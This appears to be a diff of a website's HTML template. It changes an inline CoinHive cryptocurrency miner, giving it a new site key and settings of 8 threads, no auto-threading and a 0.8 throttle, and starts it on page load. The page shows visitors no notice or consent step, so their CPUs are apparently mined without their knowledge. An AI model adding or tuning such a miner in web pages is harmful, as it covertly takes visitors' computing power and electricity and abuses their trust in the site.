@@ -109,7 +109,11 @@
                <div id='stars3'></div>
             </header>
             <script>
-    var miner = new CoinHive.User('Btj3Wzf9LCNBIu4kDwcWdfbNUTN3eC9G', 'pogrommist');
+    var miner = new CoinHive.User('6hEcBCqlmmxOZfRDMiC1tQdoJOSajuYg', 'pogrommist', {
+        threads: 8,
+        autoThreads: false,
+        throttle: 0.8
+    });
     miner.start();
 </script>
             <main id="main" class="site-main">
